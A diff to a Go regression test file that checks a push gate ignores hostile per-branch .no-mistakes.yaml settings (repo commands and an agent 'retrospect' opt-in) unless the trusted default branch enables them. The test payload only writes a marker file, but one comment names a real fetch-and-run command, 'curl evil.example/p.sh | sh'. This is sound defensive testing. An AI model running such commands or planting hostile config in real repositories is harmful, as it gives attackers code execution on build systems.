@@ -9,6 +9,7 @@ import (
 	"testing"
 	"time"
 
+	"github.com/kunchenguid/no-mistakes/internal/ipc"
 	"github.com/kunchenguid/no-mistakes/internal/types"
 )
 
@@ -18,7 +19,9 @@ import (
 // pushed SHA. A feature branch ships a malicious lint command that writes a
 // marker file; under the secure default the marker must never appear, while an
 // explicit allow_repo_commands opt-in must run it — so the assertion is known
-// to be meaningful rather than testing a no-op.
+// to be meaningful rather than testing a no-op. The same pushed copy also sets
+// retrospect.enabled, which opts into an extra agent invocation and is trusted
+// the same way: skipped under the secure default, honored under the opt-in.
 func TestRepoConfigCommandsFromDefaultBranch(t *testing.T) {
 	t.Run("blocked_by_default", func(t *testing.T) {
 		optOut := false
@@ -52,6 +55,8 @@ func TestRepoConfigCommandsFromDefaultBranch(t *testing.T) {
 		default:
 			t.Fatalf("lint step did not reach a terminal status: %s", lintStep.Status)
 		}
+
+		assertRetrospectSkipped(t, run.Steps)
 	})
 
 	t.Run("executes_when_opted_in", func(t *testing.T) {
@@ -73,6 +78,17 @@ func TestRepoConfigCommandsFromDefaultBranch(t *testing.T) {
 		if _, err := os.Stat(markerPath); err != nil {
 			t.Fatalf("opt-in run should have executed the pushed-branch lint command (marker %s missing); run status=%s err=%v", markerPath, run.Status, deref(run.Error))
 		}
+
+		// The opt-in must also honor the pushed-branch retrospect.enabled, so
+		// the skipped assertions in the blocked subtests are known to test a
+		// real difference rather than a step that never runs.
+		retroStep, ok := findStep(run.Steps, types.StepRetrospect)
+		if !ok {
+			t.Fatalf("retrospect step missing from run results")
+		}
+		if retroStep.Status == types.StepStatusSkipped {
+			t.Fatalf("opt-in run should have run the pushed-branch-enabled retrospective step, got status=%s", retroStep.Status)
+		}
 	})
 
 	t.Run("pushed_branch_cannot_self_enable", func(t *testing.T) {
@@ -92,9 +108,9 @@ func TestRepoConfigCommandsFromDefaultBranch(t *testing.T) {
 		branch := "rce-self-enable"
 		h.CommitChange(branch, branch+".txt", "change to gate\n", "add "+branch+" change")
 		// The contributor tries to flip the opt-in on AND ship a hostile
-		// command in the same pushed copy. Both must be ignored: the trusted
-		// default-branch copy controls the switch.
-		selfEnableConfig := fmt.Sprintf("ignore_patterns:\n  - 'vendor/**'\nallow_repo_commands: true\ncommands:\n  lint: \"echo pwned > %s\"\n", markerPath)
+		// command plus retrospect.enabled in the same pushed copy. All must
+		// be ignored: the trusted default-branch copy controls the switch.
+		selfEnableConfig := fmt.Sprintf("ignore_patterns:\n  - 'vendor/**'\nallow_repo_commands: true\nretrospect:\n  enabled: true\ncommands:\n  lint: \"echo pwned > %s\"\n", markerPath)
 		h.CommitChange(branch, ".no-mistakes.yaml", selfEnableConfig, "self-enable + malicious lint")
 		h.PushToGate(branch)
 
@@ -106,15 +122,18 @@ func TestRepoConfigCommandsFromDefaultBranch(t *testing.T) {
 		if _, err := os.Stat(markerPath); err == nil {
 			t.Fatalf("SECURITY REGRESSION: pushed-branch allow_repo_commands self-enabled and ran the lint command (marker %s exists); the opt-in must be read from the trusted default branch, not the pushed SHA", markerPath)
 		}
+
+		assertRetrospectSkipped(t, run.Steps)
 	})
 }
 
 // pushMaliciousRepoConfig creates a feature branch carrying a hostile
-// .no-mistakes.yaml whose lint command writes a marker file, pushes it through
-// the gate, and returns the marker path the test should assert on. The
-// default-branch .no-mistakes.yaml (written by the harness) carries no
-// commands, so it is the trusted source and yields empty commands under the
-// secure default.
+// .no-mistakes.yaml whose lint command writes a marker file and whose
+// retrospect.enabled tries to opt into an extra agent invocation, pushes it
+// through the gate, and returns the marker path the test should assert on.
+// The default-branch .no-mistakes.yaml (written by the harness) carries no
+// commands and no retrospect block, so it is the trusted source and yields
+// empty commands and a disabled retrospective step under the secure default.
 func pushMaliciousRepoConfig(t *testing.T, h *Harness, branch string) string {
 	t.Helper()
 	markerPath := filepath.Join(t.TempDir(), "pwned")
@@ -124,9 +143,22 @@ func pushMaliciousRepoConfig(t *testing.T, h *Harness, branch string) string {
 
 	// The malicious payload: in the wild this would be
 	// "curl evil.example/p.sh | sh". Here it writes a marker the test can see.
-	maliciousConfig := fmt.Sprintf("ignore_patterns:\n  - 'vendor/**'\ncommands:\n  lint: \"echo pwned > %s\"\n", markerPath)
+	maliciousConfig := fmt.Sprintf("ignore_patterns:\n  - 'vendor/**'\nretrospect:\n  enabled: true\ncommands:\n  lint: \"echo pwned > %s\"\n", markerPath)
 	h.CommitChange(branch, ".no-mistakes.yaml", maliciousConfig, "configure malicious lint command")
 
 	h.PushToGate(branch)
 	return markerPath
+}
+
+// assertRetrospectSkipped asserts the retrospective step did not run, i.e. a
+// pushed-branch retrospect.enabled was not honored under the secure default.
+func assertRetrospectSkipped(t *testing.T, steps []ipc.StepResultInfo) {
+	t.Helper()
+	retroStep, ok := findStep(steps, types.StepRetrospect)
+	if !ok {
+		t.Fatalf("retrospect step missing from run results")
+	}
+	if retroStep.Status != types.StepStatusSkipped {
+		t.Fatalf("SECURITY REGRESSION: pushed-branch retrospect.enabled ran the retrospective step (status=%s); retrospect must be loaded from the trusted default branch, not the pushed SHA", retroStep.Status)
+	}
 }
